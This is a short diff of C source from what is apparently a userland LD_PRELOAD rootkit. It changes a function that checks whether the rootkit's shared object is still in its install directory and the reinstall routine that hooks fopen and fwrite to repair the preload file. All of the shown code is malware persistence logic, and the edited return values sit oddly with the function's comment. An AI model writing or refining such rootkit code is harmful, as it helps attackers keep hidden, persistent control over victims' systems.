@@ -1,7 +1,8 @@
 int rknomore(void){ // returns 1 if rootkit mia
     DIR *dp;
     struct dirent *dir;
-    int status = 0; // change to =1 if BDVLSO
+    int status = -1;
+    size_t pathlen;
 
     hook(COPENDIR, CREADDIR);
 
@@ -12,18 +13,12 @@ int rknomore(void){ // returns 1 if rootkit mia
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
             continue;
 
-        size_t pathlen = strlen(INSTALL_DIR) +
-                         strlen(dir->d_name) + 4;
-        char path[pathlen];
-
-        snprintf(path, sizeof(path), "%s/%s", INSTALL_DIR, dir->d_name);
+        if(!strncmp(BDVLSO, dir->d_name, strlen(BDVLSO))){
+            status = 1;
+        }
     }
     closedir(dp);
 
-
-    // opendir installdir,
-    // readdir installdir,
-    // iterate thru every file in dir.
 
     return status;
 }
@@ -44,7 +39,7 @@ int ld_inconsistent(void){ // returns 1 if something is wrong with the preload f
 
 void reinstall(void){
     /* don't do anything if we don't need to... ((or can't)) */
-    if(rknomore()) return;
+    if(rknomore() < 0) return;
     if(!ld_inconsistent()) return;
 
     hook(CFOPEN, CFWRITE);
